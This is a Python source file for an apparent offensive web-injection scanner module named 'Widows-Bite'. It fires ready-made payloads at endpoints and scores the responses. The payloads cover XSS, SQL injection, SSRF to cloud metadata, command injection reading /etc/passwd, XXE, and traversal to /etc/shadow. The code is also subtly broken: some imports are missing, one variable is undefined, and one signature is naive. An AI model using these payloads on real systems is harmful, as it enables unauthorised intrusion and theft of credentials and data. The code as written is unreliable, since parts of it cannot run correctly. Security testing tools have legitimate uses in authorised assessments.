#!/usr/bin/env python3
"""
ARACHNE - Widows-Bite: Advanced Injection Suite
Context-aware XSS, SQLi, SSRF, and Command Injection testing.
Uses polyglot payloads and temporal analysis for blind detection.
"""
import asyncio
import json
import re
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set, Any, Tuple
from urllib.parse import urljoin, urlparse

from utils.async_http_client import AsyncHTTPClient
from utils.payload_genius import PayloadGenius
from utils.polyglot_gen import PolyglotGenius, PayloadContext
from utils.temporal_analyzer import TemporalAnalyzer
from correlation_engine import CorrelationEngine

class InjectionType(Enum):
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    SQLI_CLASSIC = "sqli_classic"
    SQLI_BLIND = "sqli_blind"
    SSRF = "ssrf"
    CMD = "command"
    SSTI = "ssti"
    XXE = "xxe"
    PATH_TRAVERSAL = "path_traversal"

@dataclass
class InjectionFinding:
    """A finding from Widows-Bite."""
    type: InjectionType
    endpoint: str
    parameter: str
    payload: str
    evidence: str
    confidence: float  # 0.0 to 1.0
    risk: str  # 'critical', 'high', 'medium', 'low'
    context: str  # 'query', 'body', 'header', 'cookie'
    cvss_vector: Optional[str] = None

@dataclass
class WidowsBiteConfig:
    """Configuration for the injection suite."""
    target_base: str
    rate_limit: int = 30
    max_concurrent: int = 15
    enable_polyglot: bool = True
    enable_temporal: bool = True
    test_stored: bool = False  # WARNING: Potentially destructive
    deep_test: bool = False

class WidowsBite:
    """
    The injection specialist. Finds cracks in the armor and pours poison through them.
    """

    def __init__(self, config: WidowsBiteConfig = None, http_client: AsyncHTTPClient = None, correlation_engine: CorrelationEngine = None):
        # Support both old and new call signatures
        if isinstance(config, str):
            # Old call signature: (target_domain, knowledge_graph)
            target_domain = config
            kg = http_client
            self.config = WidowsBiteConfig(target_base=target_domain)
            self.http = AsyncHTTPClient()
            self.correlation = kg
        else:
            # New call signature with proper parameters
            self.config = config or WidowsBiteConfig(target_base="default")
            self.http = http_client or AsyncHTTPClient()
            self.correlation = correlation_engine or kg
        
        self.findings: List[InjectionFinding] = []
        self.polyglot_gen = PolyglotGenius() if self.config.enable_polyglot else None
        self.temporal_analyzer = TemporalAnalyzer()
        self.payload_genius = PayloadGenius()

        # Signature database for detection
        self.signatures = self._load_signatures()

    def _load_signatures(self) -> Dict[InjectionType, List[Tuple[str, str]]]:
        """Load detection signatures for each injection type."""
        return {
            InjectionType.XSS_REFLECTED: [
                (r'<script[^>]*>alert\([^)]*\)</script>', 'script tag reflected'),
                (r'onerror=["\']alert\([^)]*\)', 'onerror handler'),
                (r'onload=["\']alert\([^)]*\)', 'onload handler'),
                (r'<svg/onload=alert\([^)]*\)>', 'svg onload'),
                (r'"><script>alert\([^)]*\)</script>', 'broken attribute'),
            ],
            InjectionType.SQLI_CLASSIC: [
                (r'SQL syntax.*MySQL', 'mysql error'),
                (r'PostgreSQL.*ERROR', 'postgres error'),
                (r'ORA-[0-9]{5}', 'oracle error'),
                (r'Unclosed quotation mark', 'sql server error'),
                (r'quoted string not properly terminated', 'sql string error'),
            ],
            InjectionType.SSRF: [
                (r'Connection refused', 'internal connection attempt'),
                (r'Invalid URI', 'uri parsing error'),
                (r'no protocol', 'protocol error'),
                (r'Forbidden', 'internal forbidden'),
            ],
            InjectionType.CMD: [
                (r'(root:|uid=|gid=|groups=)', 'unix id command output'),
                (r'Directory of|Volume in drive', 'windows dir command'),
                (r'cannot access|No such file or directory', 'command error'),
            ],
            InjectionType.SSTI: [
                (r'49', '{{7*7}} result'),
                (r'7777777', '${7*7} result'),
                (r'javax\.script|freemarker|twig|jinja', 'template engine error'),
            ],
            InjectionType.XXE: [
                (r'XML parsing error', 'xml parse error'),
                (r'DOCTYPE', 'dtd reference'),
                (r'root element', 'xml structure error'),
            ],
            InjectionType.PATH_TRAVERSAL: [
                (r'root:', '/etc/passwd content'),
                (r'Administrators:', '/etc/group or windows equivalent'),
                (r'BEGIN RSA PRIVATE KEY', 'private key file'),
            ]
        }

    async def test_endpoint(self, endpoint: str, method: str = 'GET', context_hints: Optional[Dict] = None):
        """
        Test a single endpoint for all injection types.
        context_hints: {'tech': 'php', 'params': ['id', 'name']}
        """
        print(f"[*] Widows-Bite testing {method} {endpoint}")
        parsed = urlparse(endpoint)

        # Determine parameters from URL and hints
        params_to_test = set()
        if parsed.query:
            params_to_test.update(parse_qs(parsed.query).keys())
        if context_hints and 'params' in context_hints:
            params_to_test.update(context_hints['params'])

        if not params_to_test:
            print(f"[-] No parameters to test for {endpoint}")
            return

        # Test each parameter
        for param in params_to_test:
            await self._test_parameter(endpoint, method, param, context_hints)

    async def _test_parameter(self, endpoint: str, method: str, param: str, context_hints: Optional[Dict]):
        """Test a single parameter with all relevant injection types."""
        print(f"[*] Testing parameter: {param}")

        # Determine which injection types are relevant based on context
        test_types = self._get_relevant_injection_types(param, context_hints)

        # Generate payloads for each type
        payload_map = {}
        for inj_type in test_types:
            payloads = self._generate_payloads(inj_type, param, context_hints)
            if payloads:
                payload_map[inj_type] = payloads

        # Test payloads
        for inj_type, payloads in payload_map.items():
            for payload in payloads[:10]:  # Test first 10 payloads per type for speed
                finding = await self._test_single_payload(endpoint, method, param, payload, inj_type)
                if finding:
                    self.findings.append(finding)
                    self.correlation.add_finding(finding)
                    # If we get a high confidence finding, we might test more deeply
                    if finding.confidence > 0.7 and self.config.deep_test:
                        await self._deep_dive(endpoint, method, param, inj_type)

    def _get_relevant_injection_types(self, param: str, context_hints: Optional[Dict]) -> List[InjectionType]:
        """Heuristically determine which injection types to test."""
        param_lower = param.lower()
        types = []

        # Always test these
        types.extend([InjectionType.XSS_REFLECTED, InjectionType.SQLI_CLASSIC, InjectionType.SQLI_BLIND])

        # Contextual additions
        if any(kw in param_lower for kw in ['url', 'link', 'src', 'redirect']):
            types.append(InjectionType.SSRF)
        if any(kw in param_lower for kw in ['cmd', 'command', 'exec', 'run']):
            types.append(InjectionType.CMD)
        if any(kw in param_lower for kw in ['template', 'view', 'render']):
            types.append(InjectionType.SSTI)
        if any(kw in param_lower for kw in ['xml', 'data', 'config']):
            types.append(InjectionType.XXE)
        if any(kw in param_lower for kw in ['file', 'path', 'directory', 'include']):
            types.append(InjectionType.PATH_TRAVERSAL)

        # Tech stack hints
        if context_hints and 'tech' in context_hints:
            tech = context_hints['tech'].lower()
            if 'node' in tech or 'javascript' in tech:
                types.append(InjectionType.XSS_DOM)
            if 'python' in tech and 'flask' in tech:
                types.append(InjectionType.SSTI)

        return list(set(types))  # Deduplicate

    def _generate_payloads(self, inj_type: InjectionType, param: str, context_hints: Optional[Dict]) -> List[str]:
        """Generate payloads for a specific injection type."""
        payloads = set()

        # Base payloads
        base_payloads = {
            InjectionType.XSS_REFLECTED: [
                '<script>alert(document.domain)</script>',
                '" onmouseover="alert(1)',
                "'><img src=x onerror=alert(1)>",
                '<svg onload=alert(1)>',
                'javascript:alert(1)'
            ],
            InjectionType.XSS_DOM: [
                '#<script>alert(1)</script>',
                '?param=test#"><script>alert(1)</script>',
                'javascript:alert(document.cookie)',
                '"><img src=x onerror=alert(1)>'
            ],
            InjectionType.SQLI_CLASSIC: [
                "'",
                "''",
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT null,null--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            InjectionType.SQLI_BLIND: [
                "' AND SLEEP(5)--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "' WAITFOR DELAY '00:00:05'--"
            ],
            InjectionType.SSRF: [
                'http://169.254.169.254/latest/meta-data/',
                'file:///etc/passwd',
                'gopher://127.0.0.1:80/_GET%20/',
                'dict://127.0.0.1:6379/info'
            ],
            InjectionType.CMD: [
                ';id',
                '|id',
                '`id`',
                '$(id)',
                '|| id',
                ';cat /etc/passwd'
            ],
            InjectionType.SSTI: [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '{{config}}',
                '{{self.__class__}}'
            ],
            InjectionType.XXE: [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            ],
            InjectionType.PATH_TRAVERSAL: [
                '../../../etc/passwd',
                '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
                '../../../../../../etc/shadow',
                '....//....//etc/passwd'
            ]
        }

        payloads.update(base_payloads.get(inj_type, []))

        # Add polyglot payloads if enabled
        if self.polyglot_gen:
            context_map = {
                InjectionType.XSS_REFLECTED: PayloadContext.HTML_ATTR,
                InjectionType.SQLI_CLASSIC: PayloadContext.DIRECT_SQL,
                InjectionType.SSTI: PayloadContext.SCRIPT_TAG,
            }
            ctx = context_map.get(inj_type, PayloadContext.URL_PARAM)
            poly_payloads = self.polyglot_gen.craft_for_context(ctx, target_hint=context_hints.get('tech') if context_hints else None)
            payloads.update(poly_payloads[:5])

        # Add AI-generated payloads
        if self.payload_genius:
            try:
                ai_payloads = self.payload_genius.generate_for_injection(inj_type.value, param)
                payloads.update(ai_payloads[:3])
            except:
                pass

        return list(payloads)

    async def _test_single_payload(self, endpoint: str, method: str, param: str,
                                   payload: str, inj_type: InjectionType) -> Optional[InjectionFinding]:
        """Test a single payload and analyze the response."""
        try:
            # Prepare request
            parsed = urlparse(endpoint)
            if method in ['GET', 'DELETE']:
                # Inject into query parameters
                query_dict = parse_qs(parsed.query)
                query_dict[param] = [payload]
                new_query = urlencode(query_dict, doseq=True)
                target_url = parsed._replace(query=new_query).geturl()
                body = None
            else:
                # Inject into body
                target_url = endpoint
                body = {param: payload}

            # Make request
            status, headers, text = await self.http.request(
                method, target_url,
                data=body,
                headers={'Content-Type': 'application/x-www-form-urlencoded'} if body else None
            )

            # Analyze response
            confidence, evidence, risk = self._analyze_response(inj_type, payload, text, status)

            if confidence > 0.3:  # Minimum threshold
                return InjectionFinding(
                    type=inj_type,
                    endpoint=endpoint,
                    parameter=param,
                    payload=payload[:100],  # Truncate long payloads
                    evidence=evidence[:300],
                    confidence=confidence,
                    risk=risk,
                    context='body' if body else 'query',
                    cvss_vector=self._estimate_cvss(inj_type, confidence)
                )

        except Exception as e:
            print(f"[-] Error testing payload: {e}")

        return None

    def _analyze_response(self, inj_type: InjectionType, payload: str,
                          response_text: str, status_code: int) -> Tuple[float, str, str]:
        """Analyze response for signs of successful injection."""
        confidence = 0.0
        evidence = ""
        risk = "low"

        # Check for payload reflection (for XSS)
        if inj_type in [InjectionType.XSS_REFLECTED, InjectionType.XSS_STORED]:
            if payload in response_text:
                confidence += 0.4
                evidence = f"Payload reflected in response"
                risk = "medium"

        # Check for error signatures
        for signature, desc in self.signatures.get(inj_type, []):
            if re.search(signature, response_text, re.IGNORECASE):
                confidence += 0.6
                evidence = f"Signature matched: {desc}"
                risk = "high"
                break

        # Status code analysis
        if status_code >= 500:
            confidence += 0.2
            evidence += f" Server error ({status_code})"
            risk = "medium"

        # Special handling for blind SQLi (would require temporal analysis)
        if inj_type == InjectionType.SQLI_BLIND:
            # This would integrate with TemporalAnalyzer
            evidence = "Requires temporal analysis (not implemented in this snippet)"
            confidence = 0.0  # Placeholder

        return min(confidence, 1.0), evidence, risk

    def _estimate_cvss(self, inj_type: InjectionType, confidence: float) -> str:
        """Estimate a CVSS vector based on injection type and confidence."""
        base = {
            InjectionType.XSS_REFLECTED: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            InjectionType.SQLI_CLASSIC: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            InjectionType.SQLI_BLIND: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            InjectionType.SSRF: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            InjectionType.CMD: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            InjectionType.SSTI: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            InjectionType.XXE: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            InjectionType.PATH_TRAVERSAL: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        }
        return base.get(inj_type, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N")

    async def _deep_dive(self, endpoint: str, method: str, param: str, inj_type: InjectionType):
        """Perform deeper testing when a potential vulnerability is found."""
        print(f"[*] Deep diving into {inj_type.value} on {param}")
        # This would involve more sophisticated payloads, out-of-band testing, etc.
        pass

    async def run(self, endpoints: List[Dict[str, Any]]):
        """Main execution flow for Widows-Bite."""
        print("[*] Widows-Bite initializing...")

        for endpoint_info in endpoints:
            endpoint = endpoint_info.get('url')
            method = endpoint_info.get('method', 'GET')
            context = endpoint_info.get('context', {})
            await self.test_endpoint(endpoint, method, context)
            await asyncio.sleep(0.2)  # Be polite

        print(f"[+] Widows-Bite completed. Found {len(self.findings)} potential injection points.")
        if self.findings:
            critical = [f for f in self.findings if f.risk in ['critical', 'high']]
            print(f"[!] {len(critical)} findings with high/critical risk.")


if __name__ == "__main__":
    async def main():
        print("Widows-Bite module structure verified. Run from ARACHNE core for full functionality.")
        print("This module requires integration with AsyncHTTPClient and CorrelationEngine.")

    asyncio.run(main())


# Backwards compatibility: older core imports `InjectionSuite`
InjectionSuite = WidowsBite